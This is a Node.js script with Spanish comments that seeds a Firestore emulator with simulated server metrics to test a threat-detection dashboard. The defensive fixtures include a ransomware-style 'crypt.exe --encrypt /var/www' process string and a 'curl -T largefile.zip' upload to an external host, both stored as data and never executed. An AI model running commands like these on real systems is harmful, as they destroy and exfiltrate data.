/**
 * Script para poblar métricas de servidores para probar el sistema de detección
 * Ejecutar con: node scripts/populate-server-metrics.js
 * Asegúrate de que los emuladores estén corriendo
 */

import {initializeApp} from "firebase/app";
import {
  getFirestore,
  collection,
  doc,
  getDocs,
  addDoc,
  Timestamp,
  connectFirestoreEmulator,
} from "firebase/firestore";

// Configuración de Firebase para emuladores
const firebaseConfig = {
  apiKey: "demo-api-key",
  authDomain: "demo-project.firebaseapp.com",
  projectId: "demo-lincoln",
  storageBucket: "demo-lincoln.appspot.com",
  messagingSenderId: "123456789",
  appId: "1:123456789:web:abcdef123456",
};

console.log("🔥 Inicializando Firebase...");
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Conectar a emuladores
console.log("🔌 Conectando a emuladores...");
connectFirestoreEmulator(db, "localhost", 8082);
console.log("✅ Conectado a emuladores\n");

// Función para generar número aleatorio
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

// Función para generar timestamp reciente
const recentTimestamp = (minutesAgo = 0) => {
  return Timestamp.fromDate(new Date(Date.now() - minutesAgo * 60 * 1000));
};

async function populateServerMetrics() {
  try {
    console.log("📊 Poblando métricas de servidores...\n");

    // Obtener todos los servidores
    const serversSnapshot = await getDocs(collection(db, "servers"));
    if (serversSnapshot.empty) {
      console.log("⚠️  No hay servidores en Firestore. Ejecuta primero populate-firestore.js");
      return;
    }

    const servers = serversSnapshot.docs.map((doc) => ({
      id: doc.id,
      ...doc.data(),
    }));

    console.log(`📡 Encontrados ${servers.length} servidor(es)\n`);

    // Crear métricas para cada servidor
    for (const server of servers) {
      if (!server.isActive || server.status !== "online") {
        console.log(`⏭️  Saltando ${server.name} (inactivo o offline)`);
        continue;
      }

      console.log(`📈 Creando métricas para: ${server.name}...`);

      // Métricas normales (sin amenazas)
      const normalMetrics = {
        cpuUsage: randomInt(20, 50),
        memoryUsage: randomInt(30, 60),
        diskUsage: randomInt(40, 70),
        networkIn: randomInt(10, 50) * 1024 * 1024, // 10-50 MB
        networkOut: randomInt(5, 30) * 1024 * 1024, // 5-30 MB
        activeConnections: randomInt(5, 20),
        failedLoginAttempts: randomInt(0, 2),
        processes: [
          {
            pid: 1001,
            name: "nginx",
            cpuUsage: randomInt(5, 15),
            memoryUsage: randomInt(2, 5),
            command: "nginx: master process",
            user: "www-data",
            startTime: recentTimestamp(120),
          },
          {
            pid: 1002,
            name: "node",
            cpuUsage: randomInt(10, 25),
            memoryUsage: randomInt(5, 10),
            command: "node app.js",
            user: "app",
            startTime: recentTimestamp(60),
          },
        ],
        fileChanges: [],
        networkConnections: [
          {
            protocol: "tcp",
            localAddress: server.ipAddress || "192.168.1.10",
            localPort: 80,
            remoteAddress: "192.168.1.100",
            remotePort: 54321,
            state: "ESTABLISHED",
            processName: "nginx",
            timestamp: recentTimestamp(5),
          },
        ],
        timestamp: recentTimestamp(0),
      };

      // Agregar métricas normales (últimas 24 horas, una cada hora)
      for (let i = 0; i < 24; i++) {
        const metrics = {
          ...normalMetrics,
          cpuUsage: randomInt(20, 50),
          memoryUsage: randomInt(30, 60),
          timestamp: recentTimestamp(i * 60),
        };
        await addDoc(
          collection(db, "servers", server.id, "metrics"),
          metrics,
        );
      }

      // Crear métricas con amenazas para el primer servidor (para pruebas)
      if (server.name === "Servidor Principal" || servers.indexOf(server) === 0) {
        console.log(`   ⚠️  Agregando métricas con amenazas para pruebas...`);

        // 1. Métrica con proceso sospechoso de ransomware
        const ransomwareMetrics = {
          cpuUsage: 95,
          memoryUsage: 85,
          diskUsage: 70,
          networkIn: 10 * 1024 * 1024,
          networkOut: 5 * 1024 * 1024,
          activeConnections: 15,
          failedLoginAttempts: 0,
          processes: [
            {
              pid: 9999,
              name: "crypt.exe",
              cpuUsage: 75,
              memoryUsage: 20,
              command: "crypt.exe --encrypt /var/www",
              user: "unknown",
              startTime: recentTimestamp(10),
            },
            {
              pid: 1001,
              name: "nginx",
              cpuUsage: 10,
              memoryUsage: 5,
              command: "nginx: master process",
              user: "www-data",
              startTime: recentTimestamp(120),
            },
          ],
          fileChanges: Array.from({length: 60}, (_, i) => ({
            path: `/var/www/file${i}.txt.encrypted`,
            action: "created",
            size: randomInt(1000, 10000),
            timestamp: recentTimestamp(5 - i),
            user: "unknown",
          })),
          networkConnections: [],
          timestamp: recentTimestamp(5),
        };

        await addDoc(
          collection(db, "servers", server.id, "metrics"),
          ransomwareMetrics,
        );

        // 2. Métrica con múltiples intentos de login fallidos
        const intrusionMetrics = {
          cpuUsage: 45,
          memoryUsage: 55,
          diskUsage: 60,
          networkIn: 20 * 1024 * 1024,
          networkOut: 10 * 1024 * 1024,
          activeConnections: 25,
          failedLoginAttempts: 12, // Más del umbral de 5
          processes: [
            {
              pid: 1001,
              name: "sshd",
              cpuUsage: 15,
              memoryUsage: 3,
              command: "/usr/sbin/sshd",
              user: "root",
              startTime: recentTimestamp(180),
            },
          ],
          fileChanges: [],
          networkConnections: [
            {
              protocol: "tcp",
              localAddress: server.ipAddress || "192.168.1.10",
              localPort: 22,
              remoteAddress: "203.45.67.89",
              remotePort: 54321,
              state: "SYN_SENT",
              processName: "sshd",
              timestamp: recentTimestamp(2),
            },
            {
              protocol: "tcp",
              localAddress: server.ipAddress || "192.168.1.10",
              localPort: 22,
              remoteAddress: "203.45.67.89",
              remotePort: 54322,
              state: "SYN_SENT",
              processName: "sshd",
              timestamp: recentTimestamp(1),
            },
          ],
          timestamp: recentTimestamp(3),
        };

        await addDoc(
          collection(db, "servers", server.id, "metrics"),
          intrusionMetrics,
        );

        // 3. Métrica con transferencia masiva de datos
        const dataLeakMetrics = {
          cpuUsage: 60,
          memoryUsage: 70,
          diskUsage: 65,
          networkIn: 50 * 1024 * 1024,
          networkOut: 150 * 1024 * 1024, // 150 MB (más del umbral de 100 MB)
          activeConnections: 8,
          failedLoginAttempts: 0,
          processes: [
            {
              pid: 2001,
              name: "curl",
              cpuUsage: 30,
              memoryUsage: 5,
              command: "curl -T largefile.zip https://external-service.com/upload",
              user: "app",
              startTime: recentTimestamp(15),
            },
          ],
          fileChanges: [],
          networkConnections: [
            {
              protocol: "tcp",
              localAddress: server.ipAddress || "192.168.1.10",
              localPort: 443,
              remoteAddress: "104.16.132.229",
              remotePort: 443,
              state: "ESTABLISHED",
              processName: "curl",
              timestamp: recentTimestamp(10),
            },
          ],
          timestamp: recentTimestamp(2),
        };

        await addDoc(
          collection(db, "servers", server.id, "metrics"),
          dataLeakMetrics,
        );

        // 4. Métrica con comportamiento anómalo (CPU muy alto)
        const anomalyMetrics = {
          cpuUsage: 95, // Muy alto
          memoryUsage: 92, // Muy alto
          diskUsage: 75,
          networkIn: 30 * 1024 * 1024,
          networkOut: 20 * 1024 * 1024,
          activeConnections: 12,
          failedLoginAttempts: 0,
          processes: [
            {
              pid: 3001,
              name: "unknown_process",
              cpuUsage: 80,
              memoryUsage: 25,
              command: "unknown_process --suspicious",
              user: "unknown",
              startTime: recentTimestamp(20),
            },
          ],
          fileChanges: [],
          networkConnections: [],
          timestamp: recentTimestamp(1),
        };

        await addDoc(
          collection(db, "servers", server.id, "metrics"),
          anomalyMetrics,
        );

        console.log(`   ✅ Métricas con amenazas creadas`);
      }

      console.log(`   ✅ ${server.name} - Métricas creadas\n`);
    }

    console.log("✅ Métricas de servidores pobladas exitosamente!");
    console.log("\n💡 Próximos pasos:");
    console.log("   1. Ejecuta las detecciones manualmente o espera la ejecución programada");
    console.log("   2. Verifica las alertas creadas en el dashboard");
    console.log("   3. Revisa los logs de auditoría en Firestore");
  } catch (error) {
    console.error("❌ Error poblando métricas:", error);
    throw error;
  }
}

// Ejecutar
populateServerMetrics()
  .then(() => {
    console.log("\n✅ Script completado");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\n❌ Error:", error);
    process.exit(1);
  });

